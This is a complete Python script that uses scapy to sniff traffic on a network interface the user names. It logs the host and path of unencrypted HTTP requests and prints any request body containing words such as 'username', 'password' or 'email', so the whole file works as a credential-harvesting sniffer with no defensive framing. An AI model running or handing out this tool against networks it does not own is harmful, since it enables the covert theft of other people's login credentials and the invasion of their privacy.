#!/usr/bin/env python
import scapy.all as scapy
import argparse
from scapy.layers import http
def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] Http Request >> " + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode())
        if packet.haslayer(scapy.Raw):
            try:
                load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                keys = ["username", "password", "pass", "email"]
                for key in keys:
                    if key in load:
                        print("\n\n\n[+] Possible password/username >> " + load + "\n\n\n")
                        break
            except UnicodeDecodeError:
                print("\n\n\n[!] Error decoding packet payload\n\n\n")



iface = get_interface()
sniff(iface)